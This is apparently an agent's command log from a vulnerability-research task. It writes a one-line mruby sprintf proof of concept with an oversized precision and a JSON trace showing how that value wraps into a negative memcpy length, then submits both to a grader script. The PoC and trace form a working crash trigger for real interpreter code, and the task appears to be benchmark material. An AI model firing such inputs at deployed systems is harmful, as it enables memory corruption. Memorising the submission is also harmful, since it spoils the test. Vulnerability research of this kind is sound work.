message:
Running command: cd /workspace && cat > poc.rb <<'RB'
# Trigger oversized precision in mruby sprintf
sprintf("%.2147483648s", "A")
RB
cat > candidate_trace.json <<'JSON'
[{"step":1,"file":"mrbgems/mruby-sprintf/src/sprintf.c","function":"mrb_str_format","line":731,"var":"prec","code":"GETNUM(prec, precision);","note":"The precision field is parsed from attacker-controlled format text into an mrb_int and then narrowed to int without a range check."},{"step":2,"file":"mrbgems/mruby-sprintf/src/sprintf.c","function":"get_num","line":548,"var":"next_n","code":"*valp = (int)next_n;","note":"The parser explicitly casts the accumulated precision to int, so values above INT_MAX wrap into a negative precision."},{"step":3,"file":"mrbgems/mruby-sprintf/src/sprintf.c","function":"mrb_str_format","line":889,"var":"prec","code":"if ((flags&FPREC) && (prec < slen)) { char *p = RSTRING_PTR(str) + prec; slen = prec; len = (mrb_int)(p - RSTRING_PTR(str)); }","note":"For %s/%p, the wrapped negative precision is used as a byte offset and length, producing a negative copy length."},{"step":4,"file":"mrbgems/mruby-sprintf/src/sprintf.c","function":"mrb_str_format","line":905,"var":"len","code":"PUSH(RSTRING_PTR(str), len);","note":"The negative length reaches memcpy through PUSH, creating the memory-copy sink that can underflow into an oversized copy."}]
JSON
bash /workspace/submit.sh /workspace/poc.rb /workspace/candidate_trace.json
